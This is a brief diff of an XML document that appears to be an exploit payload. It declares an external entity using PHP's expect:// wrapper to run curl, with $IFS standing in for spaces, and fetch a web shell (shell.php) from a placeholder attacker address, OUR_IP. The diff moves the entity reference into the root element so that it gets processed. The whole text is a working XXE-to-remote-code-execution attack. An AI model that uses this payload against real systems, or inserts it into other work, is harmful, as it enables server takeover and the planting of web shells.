@@ -6,4 +6,4 @@
 <!DOCTYPE email [
   <!ENTITY company SYSTEM "expect://curl$IFS-O$IFS'OUR_IP/shell.php'">
 ]>
-<root><name></name><tel></tel><email>&company;</email><message></message></root>
+<root>&company;</root>
